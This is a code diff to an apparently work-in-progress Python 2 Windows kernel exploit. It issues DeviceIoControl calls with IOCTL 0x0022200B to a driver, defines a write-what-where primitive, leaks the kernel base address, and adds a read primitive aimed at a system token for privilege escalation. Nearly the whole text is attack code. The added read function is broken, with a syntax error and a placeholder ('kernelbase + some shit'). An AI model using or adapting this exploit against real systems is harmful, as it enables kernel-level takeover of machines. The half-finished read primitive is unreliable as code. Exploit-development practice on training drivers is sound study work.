@@ -8,8 +8,7 @@ import time
 import platform
 from ctypes import *
 from ctypes.wintypes import *
-
-# easy definitions to save characters
+############################################ Windows Constants ##############################################
 
 ntdll = windll.ntdll
 kernel32 = windll.kernel32
@@ -79,99 +78,7 @@ if dwStatus != STATUS_SUCCESS:
     print ('Something went wrong while allocating memory', 'e')
     sys.exit()
 
-################################################### WRITE ###########################################################
-def writePrimitive(driver, what=None, where=None):
-    what_addr = 0x000000001a001000
-    # Write the what value to what_addr
-    data = struct.pack('<Q', what)
-    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
-            what_addr, data, len(data), byref(written))
-    
-    if dwStatus == 0:
-        print ('Something went wrong while writing to memory', 'e')
-        sys.exit()
-        
-    data = struct.pack('<Q', what_addr) + struct.pack('<Q', where)
-    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
-            0x000000001a000000, data, len(data), byref(written))
-    
-    if dwStatus == 0:
-        print ('Something went wrong while writing to memory in the packing section'
-               , 'e')
-        sys.exit()
-        
-    IoControlCode = 0x0022200B
-    InputBuffer = c_void_p(0x000000001a000000)
-    InputBufferLength = 0x10
-    OutputBuffer = c_void_p(0)
-    OutputBufferLength = 0
-    dwBytesReturned = c_ulong()
-    lpBytesReturned = byref(dwBytesReturned)
-    
-    print 'Value before DeviceIoControl: %08x' \
-        % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
-    
-    triggerIOCTL = kernel32.DeviceIoControl(
-        driver,
-        IoControlCode,
-        InputBuffer,
-        InputBufferLength,
-        OutputBuffer,
-        OutputBufferLength,
-        lpBytesReturned,
-        NULL,
-        )
-    
-    print 'Value after: %08x' % cast(0x000000001a002000,
-            POINTER(c_ulonglong))[0]
-    return triggerIOCTL
 
-################################################### WRITE ###########################################################
-def writePrimitive(driver, what=None, where=None):
-    what_addr = 0x000000001a001000
-    # Write the what value to what_addr
-    data = struct.pack('<Q', what)
-    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
-            what_addr, data, len(data), byref(written))
-    
-    if dwStatus == 0:
-        print ('Something went wrong while writing to memory', 'e')
-        sys.exit()
-        
-    data = struct.pack('<Q', what_addr) + struct.pack('<Q', where)
-    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
-            0x000000001a000000, data, len(data), byref(written))
-    
-    if dwStatus == 0:
-        print ('Something went wrong while writing to memory in the packing section'
-               , 'e')
-        sys.exit()
-        
-    IoControlCode = 0x0022200B
-    InputBuffer = c_void_p(0x000000001a000000)
-    InputBufferLength = 0x10
-    OutputBuffer = c_void_p(0)
-    OutputBufferLength = 0
-    dwBytesReturned = c_ulong()
-    lpBytesReturned = byref(dwBytesReturned)
-    
-    print 'Value before DeviceIoControl: %08x' \
-        % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
-    
-    triggerIOCTL = kernel32.DeviceIoControl(
-        driver,
-        IoControlCode,
-        InputBuffer,
-        InputBufferLength,
-        OutputBuffer,
-        OutputBufferLength,
-        lpBytesReturned,
-        NULL,
-        )
-    
-    print 'Value after: %08x' % cast(0x000000001a002000,
-            POINTER(c_ulonglong))[0]
-    return triggerIOCTL
 ########################################## KERNEL BASE ################################################
 def getkernelBase(driver_handle, what=None, where=None):
     print '[*] Calling NtQuerySystemInformation w/SystemModuleInformation'
@@ -226,6 +133,88 @@ def getkernelBase(driver_handle, what=None, where=None):
             
             return (img_name, kernel_base)
     counter += sizeof(tmp)
+
+################################################### WRITE ###########################################################
+def writePrimitive(driver, what=None, where=None):
+    what_addr = 0x000000001a001000
+    # Write the what value to what_addr
+    data = struct.pack('<Q', what)
+    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
+            what_addr, data, len(data), byref(written))
+    
+    if dwStatus == 0:
+        print ('Something went wrong while writing to memory', 'e')
+        sys.exit()
+        
+    data = struct.pack('<Q', what_addr) + struct.pack('<Q', where)
+    dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF,
+            0x000000001a000000, data, len(data), byref(written))
+    
+    if dwStatus == 0:
+        print ('Something went wrong while writing to memory in the packing section'
+               , 'e')
+        sys.exit()
+        
+    IoControlCode = 0x0022200B
+    InputBuffer = c_void_p(0x000000001a000000)
+    InputBufferLength = 0x10
+    OutputBuffer = c_void_p(0)
+    OutputBufferLength = 0
+    dwBytesReturned = c_ulong()
+    lpBytesReturned = byref(dwBytesReturned)
+    
+    print 'Value before DeviceIoControl: %08x' \
+        % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
+    
+    triggerIOCTL = kernel32.DeviceIoControl(
+        driver,
+        IoControlCode,
+        InputBuffer,
+        InputBufferLength,
+        OutputBuffer,
+        OutputBufferLength,
+        lpBytesReturned,
+        NULL,
+        )
+    
+    print 'Value after: %08x' % cast(0x000000001a002000,
+            POINTER(c_ulonglong))[0]
+    return triggerIOCTL
+################################################### READ ###########################################################
+def readPrimitive(driver, , where=None):
+
+    #We've created a block of memory at the top of userland via dwStatus
+
+    what_addr = kernelbase + some shit #some shit here system token address
+    where = 0x000000001a001000
+
+    IoControlCode = 0x0022200B
+    InputBuffer = c_void_p(0x000000001a001000)
+    InputBufferLength = 0x10
+    OutputBuffer = c_void_p(0)
+    OutputBufferLength = 0
+    dwBytesReturned = c_ulong()
+    lpBytesReturned = byref(dwBytesReturned)
+    
+    print 'Value before DeviceIoControl: %08x' \
+        % cast(where, POINTER(c_ulonglong))[0]
+    
+    triggerIOCTL = kernel32.DeviceIoControl(
+        driver,
+        IoControlCode,
+        InputBuffer,
+        InputBufferLength,
+        OutputBuffer,
+        OutputBufferLength,
+        lpBytesReturned,
+        NULL,
+        )
+    
+    #Will this read our token then?
+    print 'Value after: %08x' % cast(0x000000001a001000,
+            POINTER(c_ulonglong))[0]
+    return triggerIOCTL
+
 ########################################### MAIN ##############################################
 def executeOverwrite():
     driver_handle = kernel32.CreateFileA(
